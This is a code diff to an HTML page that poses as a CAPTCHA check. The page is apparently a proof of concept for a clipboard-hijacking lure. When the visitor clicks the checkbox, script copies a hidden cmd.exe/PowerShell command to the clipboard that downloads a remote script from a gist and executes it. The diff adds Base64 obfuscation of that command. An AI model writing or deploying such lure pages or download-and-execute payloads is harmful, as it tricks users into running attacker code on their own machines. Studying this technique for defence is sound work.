@@ -56,20 +56,27 @@
     </div>
     <script>
     document.getElementById('captchaCheckbox').addEventListener('click', () => {
-        const cmd = "cmd.exe";
-        const args = "/c powershell -WindowStyle Hidden -Command ";
-        const scriptUrl = "'https://gist.githubusercontent.com/Mrlukerwilkinson/a485c2fef0571df4c2c8c4106b482efd/raw/e1c30bb8c05cbecafbf9d11f3091c36a4896ee06/click_jacking_poc';";
-        const createClient = "$client=New-Object System.Net.WebClient;";
-        const fetchScript = "$content=$client.DownloadString(" + scriptUrl + ");";
-        const executeScript = "Invoke-Expression $content;";
-        const fullCommand = `${cmd} ${args}"${createClient} ${fetchScript} ${executeScript}"`;
+        // The PowerShell script to download and execute the file
+        const powershellScript = `
+            $scriptUrl = 'https://gist.githubusercontent.com/Mrlukerwilkinson/a485c2fef0571df4c2c8c4106b482efd/raw/e1c30bb8c05cbecafbf9d11f3091c36a4896ee06/click_jacking_poc';
+            $content = (Invoke-WebRequest -Uri $scriptUrl).Content;
+            Invoke-Expression $content;
+        `;
 
+        // Encode the PowerShell script into Base64
+        const encodedCommand = btoa(unescape(encodeURIComponent(powershellScript)));
+
+        // Construct the full command to run in cmd.exe
+        const fullCommand = `cmd.exe /c powershell -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCommand}`;
+
+        // Write the encoded command to the clipboard
         navigator.clipboard.writeText(fullCommand).then(() => {
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('popup').style.display = 'block';
             document.getElementById('dimmableContainer').classList.add('dimmed');
         });
     });
-    </script>
+</script>
+
 </body>
 </html>
